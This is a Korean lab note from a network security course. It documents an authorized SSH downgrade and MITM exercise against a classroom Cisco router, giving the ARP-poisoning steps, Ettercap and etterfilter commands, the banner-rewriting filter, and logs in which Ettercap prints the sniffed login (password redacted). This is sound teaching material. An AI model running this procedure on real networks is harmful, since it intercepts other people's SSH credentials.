---
type: lab
topic: network-security
parent_moc: "[[10_학습 노트/시스템보안/네트워크보안/00_네트워크보안_목차]]"
source: 5-13 네트워크보안.pdf
source_pages:
  - 73-78
status: stable
created: 2026-05-18
tags:
  - 🏷️과목/네트워크보안
  - 🏷️주제/SSH
  - 🏷️주제/SSH-MITM
  - 🏷️주제/Ettercap
---

# SSH MITM 실습

## 한 줄 요약

Ettercap과 ARP Poisoning을 이용해 SSH 연결 초기 협상 메시지를 조작하고, 조건이 맞을 때 SSH downgrade / MITM 가능성을 관찰하는 실습이다.

> [!note] 선행 실습
> Ettercap filter 문법과 패킷 변조 원리는 [[Ettercap Filter 패킷 변조 실습]]에서 먼저 확인한다.
> 이 노트는 그 원리를 SSH Version Negotiation / Downgrade Attack에 적용하는 응용 실습이다.

---

## 실습 목표

- SSH Version Negotiation 관찰
- Ettercap filter의 역할 이해
- ARP Poisoning으로 MITM 위치 확보
- downgrade 시도 과정을 절차로 재현
- 현대 SSH 환경에서 실패할 수 있는 이유 확인
- 실습 종료 후 정상 상태로 되돌리는 방법 정리

---

## 선행 실습과의 차이

이 노트는 [[Ettercap Filter 패킷 변조 실습]]의 응용이다.

| 구분 | Ettercap Filter 패킷 변조 실습 | SSH MITM 실습 |
| --- | --- | --- |
| 대상 통신 | Netcat 평문 TCP | SSH 초기 Version Negotiation |
| 바꾸는 값 | `hello` → `hehe` | `SSH-1.99` → `SSH-1.51` |
| 목표 | 평문 데이터 변조 확인 | SSH downgrade 시도 관찰 |
| 성공 기준 | 반대편에 `hehe`가 보임 | 배너 조작 / downgrade 수용 여부 확인 |
| 한계 | 평문이라 결과가 바로 보임 | 현대 SSH에서는 거부될 수 있음 |

> [!important] 핵심
> Netcat 실습에서는 문자열이 바뀌면 바로 성공으로 볼 수 있었다.
> 하지만 SSH 실습에서는 문자열 치환이 되더라도 Client / Server가 downgrade를 거부할 수 있다.
> 따라서 이 실습의 핵심은 “비밀번호가 보였는가”가 아니라, **협상 문자열 조작이 어느 단계까지 영향을 줬는가**를 판정하는 것이다.

---

## 실습 전제

이 실습은 아래 개념을 먼저 알고 보는 편이 좋다.

- [[SSH 보안 구조]]
- [[SSH Downgrade Attack]]
- [[Ettercap Filter 패킷 변조 실습]]
- [[ARP 스푸핑]]

주의:

- 허가된 실습 환경에서만 수행한다.
- 실제 계정 정보는 노트에 남기지 않는다.
- 현대 SSH 클라이언트 / 서버는 downgrade를 거부할 수 있다.
- 실습 실패처럼 보이는 결과가 실제로는 방어가 정상 동작한 결과일 수 있다.

---

## 실습 환경

PDF는 구체 IP를 제시하지 않고 `Client`, `Server`, `Kali` 역할 중심으로 설명한다.
따라서 이 노트도 확인되지 않은 IP를 invent하지 않는다.

| 장비 | 역할 |
| --- | --- |
| Client | SSH 접속을 시도하는 피해자 |
| Server | SSH 서버 |
| Kali | Ettercap 실행 / MITM 수행 |

이번 수업 실습에서 관찰한 SSH 서버 대상은 R 1 라우터였다.

| 장비  | 역할                  | 관찰 IP          |
| --- | ------------------- | -------------- |
| R1  | SSH Server / Router | `172.16.0.254` |
> [!note] 대상 확인
> BackTrack에서 처음 `ssh R1@172.16.0.150`으로 접속을 시도했지만, 실제 SSH 대상은 R1 라우터 `172.16.0.254`였다.
> 실습에서 Target을 잡기 전에 “어느 장비가 SSH 서버인지”를 먼저 확인해야 한다.

---

## 전체 흐름

```text
0. 사전 확인
0-1. R1에서 SSH 서버 설정
0-2. Client에서 SSH 접속 확인
1. SSH filter 준비
2. etterfilter로 컴파일
3. Ettercap 실행
4. Host Scan
5. Client / Server를 Target으로 지정
6. ARP Poisoning
7. MITM 성립 확인
8. filter load
9. sniffing 시작
10. Client에서 Server로 SSH 접속
11. 결과 확인
```

---

## 0. 사전 확인

Ettercap을 켜기 전에 기본 조건을 먼저 확인한다.

- Client에서 Server로 SSH 접속이 정상적으로 되는가?
- Kali가 Client와 Server 사이의 L2 네트워크에 있는가?
- Client와 Server의 실제 IP를 확인했는가?
- [[Ettercap Filter 패킷 변조 실습]]처럼 filter 작성 / 컴파일 / 로드 흐름을 이해했는가?
- Client / Server가 구형 SSH 호환 경로를 허용하는 실습용 환경인가?
- Host Key warning이 나올 수 있음을 알고 있는가?
- SSH 서버 장비가 실제로 SSH를 활성화했고, 접속 대상 IP가 맞는가?

> [!note] 사전 확인의 의미
> 정상 SSH 접속 자체가 안 되면 이 실습은 downgrade 문제가 아니라 기본 연결 문제부터 봐야 한다.
> 반대로 정상 SSH 접속은 되는데 downgrade가 실패한다면, 현대 SSH 방어가 정상 동작한 결과일 수 있다.

---

## 0-1. R1에서 SSH 처음부터 설정하기

목표는 R1 라우터 `172.16.0.254`에 SSH 서버를 켜고, Client에서 다음처럼 접속 가능한 상태를 만드는 것이다.

```bash
ssh unoh@172.16.0.254
```

### 1. 설정 모드 진입

```ios
R1>enable
R1#conf t
```

### 2. hostname과 domain name 설정

SSH RSA 키 이름은 보통 `hostname.domain-name` 형태와 연결된다.
따라서 hostname과 domain name이 먼저 있어야 한다.

**R1(config)#**
```ios
hostname R1
ip domain-name unoh.com
```

### 3. SSH 로그인 계정 생성

VTY에서 `login local`을 쓸 것이므로 라우터 로컬 사용자 계정이 필요하다.

**R1(config)#**
```ios
username unoh secret <PASSWORD>
```

> [!warning] 비밀번호 기록 금지
> 실습 노트에는 실제 비밀번호를 적지 않는다.
> 필요하면 `<PASSWORD>`처럼 표시한다.

### 4. RSA 키 생성

SSH 서버가 동작하려면 RSA 키가 필요하다.

**R1(config)#**
```ios
crypto key generate rsa
```

키 길이를 물어보면 실습에서는 `2048`을 사용했다.

```text
How many bits in the modulus [512]: 2048
```

이미 키가 있으면 교체 여부를 물어볼 수 있다.
실습 환경에서 다시 만들 목적이면 `yes`로 진행한다.

```text
% You already have RSA keys defined named R1.unoh.com.
% Do you really want to replace them? [yes/no]: yes
```

### 5. SSH 버전 설정

일반적인 방어 관점에서는 SSH 2만 사용한다.
```ios
ip ssh version 2
```

다만 Downgrade 실습이 성립하기 위해 `SSH-1.99` 를 사용한다.

```ios
no ip ssh version
```

> [!warning] 주의
> `ip ssh version 1` 같은 구형 SSH 허용 설정은 취약한 실습용 설정이다.
> 실제 환경에서는 SSH2만 사용하는 쪽이 맞다.

### 6. VTY 라인에서 SSH 로그인 허용

SSH 접속은 VTY 라인을 통해 들어온다.
로컬 사용자 DB를 사용하고, 접속 프로토콜은 SSH로 제한한다.

**R1(config)#**
```ios
line vty 0 4
login local
transport input ssh
exit
```

### 7. 설정 확인

**R1(config)#**
```ios
do show ip ssh
do show run | section line vty
do show run | include username|ip ssh|domain|hostname
```

확인할 것:

- SSH가 enabled 상태인가?
- SSH version이 의도한 값인가?
- `line vty 0 4`에 `login local`이 있는가?
- `transport input ssh`가 있는가?
- 접속에 사용할 `username`이 있는가?

### 8. 설정 저장

실습 장비를 재부팅해도 유지하려면 저장한다.

**R1#**
```ios
cop r s
```
또는:
```ios
wr
```

### 수업 중 실제 로그

아래는 수업 중 R1에서 SSH 키를 다시 만들며 관찰한 로그다.

```ios
R1#conf
Configuring from terminal, memory, or network [terminal]?
Enter configuration commands, one per line. End with CNTL/Z.
R1(config)#ip domain-name unoh.com
R1(config)#crypto key geneeat rsa
                 ^
% Invalid input detected at '^' marker.
```

위 실패는 명령 오타다.

```text
geneeat
```

정상 명령은 다음이다.

```ios
R1(config)#crypto key generate rsa
```

이미 RSA 키가 있으면 교체 여부를 묻는다.

```text
% You already have RSA keys defined named R1.unoh.com.
% Do you really want to replace them? [yes/no]: yes
```

키 길이는 실습에서 `2048`로 입력했다.

```text
How many bits in the modulus [512]:
*Mar  1 00:59:19.727: %SSH-5-DISABLED: SSH 2.0 has been disabled
2048
% Generating 2048 bit RSA keys, keys will be non-exportable...[OK]

*Mar  1 00:59:31.775: %SSH-5-ENABLED: SSH 2.0 has been enabled
```

의미:

- RSA 키를 재생성하는 동안 SSH가 잠시 비활성화될 수 있다.
- 키 생성이 끝나면 SSH 2.0이 다시 활성화된다.
- 이 로그만 보면 현재 R1은 SSH2 중심으로 동작한다.

---

## 0-2. Client에서 SSH 접속 확인

공격 실습을 시작하기 전에 먼저 정상 SSH 접속을 확인한다.

### BackTrack / Linux 계열

```bash
ssh unoh@172.16.0.254
```

처음 접속하면 Host Key 확인 메시지가 나올 수 있다.

```text
The authenticity of host '172.16.0.254 (172.16.0.254)' can't be established.
Are you sure you want to continue connecting (yes/no)?
```

실습망에서 대상이 R1이 맞다면 `yes`로 진행한다.
실제 운영망에서는 fingerprint를 검증하지 않고 무작정 `yes`를 누르면 안 된다.

Host Key warning이나 최신 OpenSSH / 구형 IOS 호환성 문제는 본선 절차와 분리해서 아래 [[#트러블슈팅]]에서 확인한다.

### 접속 실패 시 먼저 볼 것

R1:

```ios
R1#show ip ssh
R1#show users
R1#show run | section line vty
R1#show run | include username|ip ssh|domain|hostname
```

Client:

```bash
ping 172.16.0.254
ssh unoh@172.16.0.254
```

---

## 1. Ettercap filter 작성

PDF 73-74쪽 흐름은 Kali에 이미 존재하는 SSH filter를 복사해 사용하는 방식이다.

```bash
cp /usr/local/share/ettercap/etter.filter.ssh ./etter.filter.ssh
```

필터의 핵심은 서버 응답에서 버전 문자열을 찾아 바꾸는 것이다.

```c
replace("SSH-1.99", "SSH-1.51")
```

이 문자열이 왜 중요한지는 별도 개념 노트에서 다룬다.

- [[SSH Downgrade Attack]]

---

## 2. etterfilter 컴파일

복사한 필터를 Ettercap이 읽을 수 있는 형식으로 컴파일한다.

```bash
etterfilter etter.filter.ssh -o etter.filter.ssh.co
```

확인할 것:

- 입력 파일이 존재하는가
- 출력 파일 `etter.filter.ssh.co`가 생성되었는가

---

## 3. Ettercap 실행

PDF는 터미널 모드와 GUI 모드를 모두 제시한다.
이번 수업 환경에서는 **GUI 모드 사용을 권장**한다.

이유:

- Text mode에서는 출력 글자가 깨져 보일 수 있다.
- `[SSH Filter] SSH downgraded from version 2 to 1` 같은 메시지가 화면에서 제대로 보이지 않을 수 있다.
- GUI가 Host Scan, Target 지정, Filter load 상태를 확인하기 쉽다.

> [!note] 정리
> CLI 명령은 재현성이 좋지만, 이번 BackTrack / Ettercap 실습에서는 GUI가 관찰과 조작에 더 안정적이었다.

```bash
ettercap -T -M arp -F etter.filter.ssh.co /<IP>/ /<IP>/
```

CLI 모드의 `/<IP>/ /<IP>/` 두 대상은 GUI에서 지정하는 `Target 1` / `Target 2`에 해당한다.
실제 `Client`와 `Server` IP를 확인한 뒤에만 넣는다.
PDF나 vault에 없는 IP는 임의로 쓰지 않는다.

또는 GUI 모드:

```bash
ettercap -G
```

GUI 흐름을 따를 때는 이후 단계에서 인터페이스와 대상 호스트를 직접 선택한다.

---

## 4. Host Scan

GUI 기준 절차:
![[Pasted image 20260519173048.png]]
![[Pasted image 20260519173121.png]]
목적:
- 공격 대상이 실제로 탐지되는지 확인
- Client와 Server를 구분

---

## 5. Target 지정

![[Pasted image 20260519173241.png]]
![[Pasted image 20260519173210.png]]

Target 방향은 실제 SSH 트래픽 경로와 맞아야 한다.
Client와 Server를 잘못 고르면 이후 절차가 모두 진행되어도 관찰 결과가 나오지 않을 수 있다.

---

## 6. ARP Poisoning

![[Pasted image 20260519173325.png]]


이 단계의 목적은 Client와 Server 사이 트래픽이 Kali를 경유하게 만드는 것이다.

---

## 7. MITM 성립 확인

Filter를 보기 전에 먼저 Client와 Server 사이 트래픽이 실제로 Kali를 지나가는지 확인한다.

확인 방법 예시:

Windows:

```cmd
arp -a
```

Linux:

```bash
ip neigh
```

확인 관점:

```text
Client 또는 Server의 ARP Cache에서
상대방 IP의 MAC 주소가 Kali의 MAC 주소처럼 보이는지 확인한다.
```

> [!note] 확인 포인트
> ARP Poisoning이 실패하면 filter가 아무리 정확해도 SSH 패킷을 바꿀 기회가 없다.
> 실제 MAC 주소는 실습 환경마다 다르므로 노트에 고정값으로 적지 않는다.

---

## 8. Filter load

GUI 기준:

![[Pasted image 20260519173405.png]]
![[Pasted image 20260519173426.png]]
확인할 것:

- 컴파일한 필터 파일을 선택했는가
- 의도한 필터가 실제로 로드되었는가

### Filter 파일 접근 문제

Ettercap GUI에서 `/root/etter.filter.ssh.co` 파일에 접근하지 못할 수 있다.
이 경우 컴파일된 filter 파일을 Ettercap 기본 경로로 복사한다.

```bash
cp /root/etter.filter.ssh.co /usr/local/share/ettercap/
```

복사 후 GUI에서 다음 위치의 파일을 선택한다.

```text
/usr/local/share/ettercap/etter.filter.ssh.co
```

확인:

```bash
ls -l /usr/local/share/ettercap/etter.filter.ssh.co
```

---

## 9. Sniffing 시작

GUI 기준:
![[Pasted image 20260519173444.png]]

이후 Ettercap에서 버전 협상 조작 로그나 관찰 결과를 확인한다.

---

## 10. Client에서 SSH 접속

최종 성공 확인은 Windows Client의 구버전 PuTTY로 진행했다.
최신 Windows OpenSSH는 SSH1 fallback을 거부할 수 있으므로, 이 실습의 Client로는 적합하지 않았다.

PuTTY에서 접속 대상은 R1이다.

```text
Host Name: 172.16.0.254
Port: 22
Connection type: SSH
```

PuTTY SSH 설정에서 `Preferred SSH protocol version`을 확인한다.

| 설정 | 의미 | 이 실습에서의 의미 |
| --- | --- | --- |
| `2 only` | SSH2만 허용 | banner가 SSH1처럼 바뀌면 연결을 거부할 수 있음 |
| `2` | SSH2를 선호하지만 SSH1 fallback 허용 | downgrade 수용 여부를 관찰하기 좋음 |
| `1 only` | SSH1만 사용 | SSH1 접속 확인은 가능하지만 downgrade 유도 증거로는 약함 |

이번 실습에서는 `2 only`가 아니라 `2`로 바꿨다.
즉, Client는 원래 SSH2를 선호하지만, 중간에서 SSH1 계열 banner를 보면 SSH1로 내려갈 수 있는 상태가 된다.

실습 중 ID / PW를 입력하더라도, 노트에는 실제 값을 남기지 않는다.

> [!important] 4단계와의 관계
> 별도의 “정보 탈취 명령”을 추가로 실행하는 것이 아니다.
> ARP Poisoning과 Ettercap filter가 적용된 상태에서 PuTTY로 로그인하면, 그 인증 흐름을 Ettercap이 관찰해 `USER` / `PASS`를 출력하는지 확인한다.

### BackTrack 접속 시도 기록

처음에는 대상 IP를 잘못 잡았다.

```text
root@bt:~# ssh R1@172.16.0.150
Unable to negotiate a key exchange method
```

이 결과는 SSH MITM 성공 / 실패 판정이 아니라, 접속 대상과 SSH 서버 상태를 다시 봐야 한다는 신호다.
이번 실습에서 R1 라우터는 `172.16.0.254`였다.

```text
root@bt:~# ssh R1@172.16.0.254
The authenticity of host '172.16.0.254 (172.16.0.254)' can't be established.
RSA key fingerprint is df:91:a0:5f:e7:7b:b6:e7:35:d6:0a:bb:38:48:b3:1f.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.0.254' (RSA) to the list of known hosts.
Password:
Password:
Password:
R1@172.16.0.254's password:
Connection closed by 172.16.0.254
root@bt:~#
```

같은 접속에서 `Password:`가 반복된 뒤 연결이 닫히면, 우선 라우터 SSH 계정의 비밀번호 입력 실패를 의심한다.
R1의 `username ... secret ...` 설정과 실제 입력한 계정을 다시 확인한다.

이 관찰에서 볼 것:

- `172.16.0.254`는 SSH 서버로 응답했다.
- Host Key 확인 메시지가 나타났다.
- RSA fingerprint가 표시되었다.
- 인증은 성공하지 못하고 연결이 닫혔다.

> [!important] 판정
> Host Key prompt가 보였다는 것은 SSH 서버와의 초기 접속은 시작됐다는 뜻이다.
> 하지만 password prompt 이후 연결이 닫혔다면 인증 정보, 계정 설정, VTY 설정, SSH 버전 / 알고리즘 호환성을 따로 확인해야 한다.

---

## 11. 결과 판정

이 실습은 아래 4단계로만 판정한다.

```text
1. ARP MITM 성립
2. SSH banner 조작 성공
3. Client가 약한 SSH1 경로 수용
4. Ettercap에서 인증 정보 관찰
```

앞 단계가 성공해도 뒤 단계가 자동으로 성공하는 것은 아니다.

### 현재까지 관찰한 결과

| 관찰 결과 | 판정 | 의미 |
| --- | --- | --- |
| Windows OpenSSH에서 `Protocol major versions differ: 2 vs. 1` 반복 | banner 조작 영향은 있었음 | Client가 SSH1 계열 배너를 보고 거부한 상태 |
| 이후 `Password:`와 `unoh>` 진입 | 로그인 자체는 성공 | 이 출력만으로는 SSH2인지 SSH1 downgrade인지 판정하지 않음 |
| BackTrack에서 `REMOTE HOST IDENTIFICATION HAS CHANGED` | Host Key 변경 감지 | R1 RSA key 재생성 또는 MITM 가능성을 경고 |
| `ssh R1@172.16.0.150` 실패 | 대상 IP 오류 | R1 SSH 실습 결과로 보지 않음 |
| Ettercap에서 `[SSH Filter] SSH downgraded from version 2 to 1` 출력 | banner 조작 성공 | `SSH-1.99`가 `SSH-1.51`로 바뀐 증거 |
| Ettercap에서 `USER: unoh PASS: <REDACTED>` 출력 | 인증 정보 관찰 성공 | SSH1 경로에서 실습용 계정 정보가 노출됨 |
| R1 `show ssh`에서 `Version 1.5`, `3DES`, `Session started`, `Username unoh` 확인 | SSH1 세션 성립 | Client가 SSH1 계열 연결을 수용했고 세션이 시작됨 |
| PuTTY Event Log에서 `Server version: SSH-1.51-Cisco-1.25` 확인 | 조작된 banner 수신 | Client가 SSH1 계열 서버로 인식 |
| PuTTY Event Log에서 `Using SSH protocol version 1` 확인 | downgrade 수용 성공 | PuTTY가 SSH1 경로로 접속을 계속함 |
| PuTTY Event Log에서 `Sending unpadded password`, `Authentication successful` 확인 | 인증 흐름 진행 / 로그인 성공 | SSH1 방식의 password 인증이 진행됨 |

> [!important] 핵심 판정
> 구버전 PuTTY를 사용한 뒤에는 `banner 조작`, `SSH1 경로 수용`, `인증 정보 관찰`까지 모두 확인됐다.
> 따라서 최종 판정은 **SSH Downgrade Attack + MITM credential sniffing 성공**이다.

---

### 1단계. ARP MITM 성립

목표:

```text
Windows Client ↔ R1 Router 사이 SSH 트래픽이 BackTrack을 지나가게 만든다.
```

확인 위치:

```cmd
arp -a
```

또는 Ettercap의 target / poisoning 상태를 확인한다.

성공 판정:

```text
Windows가 R1 IP를 BackTrack MAC으로 알고 있거나,
R1이 Windows IP를 BackTrack MAC으로 알고 있거나,
Ettercap에서 두 대상에 대한 ARP poisoning이 유지된다.
```
![[Pasted image 20260519173740.png]]
사진에선 백트랙(250)과 라우터(254) 의 MAC 주소를 같게 인식 하고 있다.

이 단계가 안 되면 SSH filter는 적용될 기회가 없다.

---

### 2단계. SSH banner 조작 성공

목표:

```text
R1의 SSH banner `SSH-1.99`를 Client 쪽에서 `SSH-1.51`처럼 보이게 만든다.
```

Ettercap filter:

```c
if ( replace("SSH-1.99", "SSH-1.51") ) {
    msg("[SSH Filter] SSH downgraded from version 2 to 1\n");
}
```

왜 `SSH-1.51`로 바꾸는가:

```text
SSH identification string은 SSH-<protocol version>-<software version> 형태다.
R1의 `SSH-1.99`는 SSH2를 지원하면서 SSH1 호환 가능성을 나타내는 banner로 볼 수 있다.
filter는 이 문자열을 같은 길이의 `SSH-1.51`로 바꿔 Client가 SSH1 계열 서버로 인식하도록 유도한다.
```

`SSH-1`처럼 짧게 바꾸면 identification string 형식과 패킷 길이가 어긋나 실습이 깨질 수 있다.

확인 위치:

- Ettercap 출력 / 메시지 영역
- Client SSH 에러
- 필요하면 Wireshark의 SSH version string

성공 판정:

```text
[SSH Filter] SSH downgraded from version 2 to 1
```

또는 Windows OpenSSH에서:

```text
Protocol major versions differ: 2 vs. 1
```

해석:

```text
Client가 SSH2로 접속하려 했는데,
중간에서 SSH1 계열 배너를 본 상태.
```

즉, 이 결과는 **banner 조작 성공 증거**로 볼 수 있다.
하지만 여기서 끊기면 정보 탈취 성공은 아니다.

이번 성공 실습에서는 Ettercap에서 다음 로그가 확인되었다.

```text
[SSH Filter] SSH downgraded from version 2 to 1
SSH : 172.16.0.254:22 -> USER: unoh PASS: <REDACTED>
```
![[Pasted image 20260519174051.png]]

---

### 3단계. Client가 SSH1 경로를 수용

목표:

```text
Client가 조작된 SSH1 계열 배너를 거부하지 않고 접속을 계속 진행한다.
```

Windows OpenSSH 결과:

```text
Protocol major versions differ: 2 vs. 1
```

판정:

```text
실패.
Windows OpenSSH가 SSH1 fallback을 거부했다.
```

구버전 PuTTY로 새로 볼 것:

| PuTTY 설정 | 판정 의미 |
| --- | --- |
| `SSH 2 preferred`, `fallback to SSH1` 계열 | downgrade 유도 성공을 증명하기 좋음 |
| `SSH 1 only` | SSH1 MITM / credential sniffing 가능성 확인에는 좋지만, 순수한 downgrade 유도 증거로는 약함 |
| `SSH 2 only` | Windows OpenSSH와 비슷하게 거부될 가능성이 큼 |

가장 좋은 판정은 다음이다.

```text
PuTTY는 원래 SSH2를 선호한다.
Ettercap filter가 SSH1처럼 보이게 만든다.
PuTTY가 SSH1로 내려가 접속을 계속한다.
```

이 경우:

```text
downgrade 수용 성공
```

이번 성공 실습의 PuTTY Event Log에서는 다음 흐름이 확인되었다.

```text
Server version: SSH-1.51-Cisco-1.25
We claim version: SSH-1.5-PuTTY_Release_0.60
Using SSH protocol version 1
```
![[Pasted image 20260519174140.png]]
해석:

```text
Client가 조작된 SSH1 계열 banner를 받아들였고,
실제로 SSH protocol version 1로 연결을 진행했다.
```

암호화 방식도 SSH1에 맞게 내려갔다.

```text
AES not supported in SSH-1, skipping
Using 3DES encryption
Successfully started encryption
```

R1에서도 현재 세션이 SSH1 계열로 확인되었다.

```text
Version 1.5
Encryption 3DES
State Session started
Username unoh
```

### 현재 SSH 버전 확인 방법

**Client**에서 현재 SSH 협상 흐름을 보려면 접속 할 때 verbose 옵션을 붙인다.

```bash
ssh -v unoh@172.16.0.254
```

더 자세히 보려면:

```bash
ssh -vvv unoh@172.16.0.254
```

확인할 것:

```text
Remote protocol version
Local version string
kex
cipher
```

**Windows OpenSSH**에서 실습용 구형 옵션까지 붙여 확인하려면:

```powershell
ssh -vvv -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa -oCiphers=+aes128-cbc,3des-cbc unoh@172.16.0.254
```

**PuTTY**는 명령어 출력 대신 GUI의 Event Log를 본다.

```text
PuTTY 창 좌상단 아이콘 우클릭
→ Event Log
```

여기서 서버 version string, 선택된 SSH protocol, key exchange, cipher 관련 메시지를 확인한다.

R1 라우터 쪽에서는 다음을 확인한다.

```ios
R1#show ip ssh
R1#show ssh
```

| 명령 | 확인 대상 |
| --- | --- |
| `show ip ssh` | R1 SSH 서버 설정과 지원 버전 |
| `show ssh` | 현재 붙어 있는 SSH 세션 상태 |

---

### 4단계. 인증 정보 관찰

목표:

```text
downgrade 이후 약한 SSH1 흐름에서 Ettercap이 실습용 계정 정보를 관찰한다.
```

이 단계는 별도의 공격 명령을 새로 실행하는 절차가 아니다.
앞 단계까지 성공한 상태에서 Client가 PuTTY로 로그인하면, Ettercap이 그 인증 흐름을 자동으로 파싱해 보여주는지 확인하는 단계다.

```text
사용자가 PuTTY에서 ID/PW 입력
→ SSH1 인증 흐름 진행
→ Ettercap이 USER / PASS 출력 여부 관찰
```

성공 판정:

```text
Ettercap 출력 / 로그에 실습용 username 또는 password가 표시된다.
```

노트에는 실제 값을 남기지 않는다.

```text
username=<REDACTED>
password=<REDACTED>
```

주의:

```text
PuTTY가 SSH1 연결을 계속 진행해도,
Ettercap에 인증 정보가 실제로 표시되지 않으면
정보 탈취 성공으로 판정하지 않는다.
```

이번 성공 실습의 PuTTY Event Log에서는 인증 흐름이 실제로 진행됐다.

```text
Sent username "unoh"
Sending unpadded password
Sent password
Authentication successful
Allocated pty
Started session
```

그리고 Ettercap에서는 실습용 인증 정보가 출력되었다.

```text
SSH : 172.16.0.254:22 -> USER: unoh PASS: <REDACTED>
```

따라서 이 단계까지 성공으로 판정한다.

---

### 로그인 성공과 downgrade 성공 구분

라우터 프롬프트가 뜨는 것만으로는 SSH downgrade 성공을 증명할 수 없다.
**CMD**
```text
Password:
unoh>
```

위 출력은 일단 “로그인 성공”만 의미한다.
정상 SSH2로 로그인했을 수도 있고, SSH1 downgrade 이후 로그인했을 수도 있다.
따라서 반드시 접속 프로토콜과 Ettercap 출력을 같이 봐야 한다.

| 관찰 | 판정 |
| --- | --- |
| `Password:` 후 `unoh>`만 확인 | 로그인 성공. downgrade 증거로는 부족 |
| Windows OpenSSH의 `Protocol major versions differ: 2 vs. 1` | banner 조작 영향은 있었지만 Client가 SSH1을 거부 |
| PuTTY Event Log의 `Using SSH protocol version 1` | Client가 SSH1 경로를 수용 |
| R1 `show ssh`의 `Version 1.5`, `3DES`, `Session started` | 실제 세션이 SSH1 계열로 열림 |
| Ettercap의 `USER: ... PASS: ...` | 인증 정보 관찰 성공 |

최종 성공 판정은 아래 증거가 같이 있을 때만 한다.

```text
Ettercap banner 조작 로그
+ PuTTY SSH protocol version 1
+ R1 show ssh Version 1.5
+ Ettercap USER / PASS 출력
```

---

### 최종 성공 문장

이 실습을 완전 성공으로 쓰려면 아래처럼 말할 수 있어야 한다.

```text
ARP Poisoning으로 Windows Client와 R1 사이 MITM 위치를 확보했다.
Ettercap filter가 `SSH-1.99`를 `SSH-1.51`로 바꾸는 로그를 남겼다.
구버전 PuTTY가 조작된 SSH1 계열 연결을 거부하지 않고 진행했다.
Ettercap에서 실습용 인증 정보가 출력되었다.
```

이번 실습은 위 조건을 충족했다.

```
{Ettercap}
ARP poisoning victims:
 GROUP 1 : 172.16.0.100 00:0C:29:AA:3D:BF
 GROUP 2 : 172.16.0.254 C4:01:57:88:00:00

[SSH Filter] SSH downgraded from version 2 to 1
SSH : 172.16.0.254:22 -> USER: unoh  PASS: '

{PuTTY}
Server version: SSH-1.51-Cisco-1.25
We claim version: SSH-1.5-PuTTY_Release_0.60
Using SSH protocol version 1
Using 3DES encryption
Authentication successful

{ROUTER}
unoh#show ssh
Connection Version Encryption      State             Username
0               1.5        3DES      Session started         unoh
```

반대로 현재 Windows OpenSSH 결과는 이렇게 쓴다.

```text
Ettercap filter의 banner 조작 영향은 관찰됐지만,
Windows OpenSSH가 SSH1 fallback을 거부해 downgrade 수용과 인증 정보 노출까지는 진행되지 않았다.
```

---

## 트러블슈팅

### Host Key warning

R1에서 `crypto key generate rsa`로 RSA 키를 다시 만들면, Client가 예전에 저장해 둔 Host Key와 새 Host Key가 달라질 수 있다.
이때 BackTrack에서는 다음 경고가 나타날 수 있다.

```text
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that the RSA host key has just been changed.
The fingerprint for the RSA key sent by the remote host is
<FINGERPRINT>
Please contact your system administrator.
Add correct host key in /root/.ssh/known_hosts to get rid of this message.
Offending key in /root/.ssh/known_hosts:1
RSA host key for 172.16.0.254 has changed and you have requested strict checking.
Host key verification failed.
```

PuTTY에서도 같은 성격의 경고가 GUI로 나타날 수 있다.

```text
WARNING - POTENTIAL SECURITY BREACH!
The server's host key does not match the one PuTTY has cached in the registry.
This means that either the server administrator has changed the host key,
or you have actually connected to another computer pretending to be the server.
```

의미:

```text
같은 IP인데 예전에 저장한 서버 키와 지금 받은 서버 키가 다르다.
```

가능한 원인:

- R1에서 RSA key를 재생성했다.
- 실제로 MITM 공격자가 중간에 끼어들었다.
- 다른 장비가 같은 IP를 사용하고 있다.

이번 실습에서는 R1의 RSA key를 직접 재생성했으므로 설명 가능한 변화다.
대상 장비가 R1임을 확인한 뒤, 실습망에서는 기존 known_hosts 항목을 지우고 다시 접속한다.

```bash
ssh-keygen -R 172.16.0.254
```

BackTrack에 위 옵션이 없으면 직접 파일을 수정한다.

```bash
vi /root/.ssh/known_hosts
```

오류 메시지에 나온 줄 번호를 지운다.

```text
Offending key in /root/.ssh/known_hosts:1
```

실습 VM이고 저장된 Host Key를 보존할 필요가 없다면 파일을 지울 수도 있다.

```bash
rm -f /root/.ssh/known_hosts
```

> [!warning] 주의
> 실제 환경에서 이 경고를 습관적으로 지우고 넘어가면 MITM 탐지 기회를 버릴 수 있다.
> 실습에서는 “내가 R1 키를 재생성했기 때문에 발생한 경고인지”를 먼저 확인한다.

### 최신 OpenSSH와 구형 IOS 호환성

구형 Cisco IOS가 약한 KEX / Host Key / Cipher만 제안하면 최신 Windows OpenSSH가 접속을 거부할 수 있다.

예시 에러:

```text
Unable to negotiate with 172.16.0.254 port 22: no matching key exchange method found.
Their offer: diffie-hellman-group1-sha1
```

실습용으로만 호환 옵션을 임시 지정할 수 있다.

```powershell
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa -oCiphers=+aes128-cbc,3des-cbc unoh@172.16.0.254
```

> [!warning] 주의
> 위 옵션은 구형 장비 접속을 위한 실습용 예외다.
> 평상시 권장 보안 설정이 아니다.

이 명령어로도 다음이 나오면 명령어 옵션 문제가 아니라, 중간에서 SSH banner가 SSH1 계열로 바뀌었거나 R1이 SSH1 계열로 응답하는 상태로 본다.

```text
Protocol major versions differ: 2 vs. 1
```

이번 실습에서는 이 메시지를 **banner 조작 영향은 있었지만 Windows OpenSSH가 SSH1 fallback을 거부한 증거**로 판정했다.

---

## 실패 시 확인할 항목

### MITM 문제

- [ ] Kali에서 올바른 인터페이스를 사용했는가?
- [ ] Client와 Server를 올바르게 Target 1 / Target 2에 넣었는가?
- [ ] ARP Poisoning이 실제로 적용되었는가?
- [ ] Client와 Server 사이 SSH 트래픽이 Kali를 지나가는가?

### Filter 문제

- [ ] `etter.filter.ssh`가 존재하는가?
